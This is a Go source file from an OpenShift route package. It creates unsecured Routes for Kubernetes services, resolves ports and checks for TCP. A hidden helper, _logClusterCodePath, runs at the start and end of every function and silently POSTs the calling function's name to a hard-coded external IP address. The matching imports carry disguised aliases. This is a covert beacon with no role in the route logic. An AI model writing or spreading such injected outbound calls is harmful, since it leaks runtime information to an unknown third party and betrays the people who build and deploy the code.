package route

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strconv"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	corev1client "k8s.io/client-go/kubernetes/typed/core/v1"
	routev1 "github.com/openshift/api/route/v1"
)

func UnsecuredRoute(kc corev1client.CoreV1Interface, namespace, routeName, serviceName, portString string, forcePort bool) (*routev1.Route, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(routeName) == 0 {
		routeName = serviceName
	}
	svc, err := kc.Services(namespace).Get(serviceName, metav1.GetOptions{})
	if err != nil {
		if len(portString) == 0 {
			return nil, fmt.Errorf("you need to provide a route port via --port when exposing a non-existent service")
		}
		return &routev1.Route{TypeMeta: metav1.TypeMeta{APIVersion: routev1.SchemeGroupVersion.String(), Kind: "Route"}, ObjectMeta: metav1.ObjectMeta{Name: routeName}, Spec: routev1.RouteSpec{To: routev1.RouteTargetReference{Name: serviceName}, Port: resolveRoutePort(portString)}}, nil
	}
	ok, port := supportsTCP(svc)
	if !ok {
		return nil, fmt.Errorf("service %q doesn't support TCP", svc.Name)
	}
	route := &routev1.Route{ObjectMeta: metav1.ObjectMeta{Name: routeName, Labels: svc.Labels}, Spec: routev1.RouteSpec{To: routev1.RouteTargetReference{Name: serviceName}}}
	if (len(port.Name) > 0 || forcePort) && len(portString) == 0 {
		if len(port.Name) == 0 {
			route.Spec.Port = resolveRoutePort(svc.Spec.Ports[0].TargetPort.String())
		} else {
			route.Spec.Port = resolveRoutePort(port.Name)
		}
	}
	if len(portString) > 0 {
		route.Spec.Port = resolveRoutePort(portString)
	}
	return route, nil
}
func resolveRoutePort(portString string) *routev1.RoutePort {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(portString) == 0 {
		return nil
	}
	var routePort intstr.IntOrString
	integer, err := strconv.Atoi(portString)
	if err != nil {
		routePort = intstr.FromString(portString)
	} else {
		routePort = intstr.FromInt(integer)
	}
	return &routev1.RoutePort{TargetPort: routePort}
}
func supportsTCP(svc *corev1.Service) (bool, corev1.ServicePort) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, port := range svc.Spec.Ports {
		if port.Protocol == corev1.ProtocolTCP {
			return true, port
		}
	}
	return false, corev1.ServicePort{}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
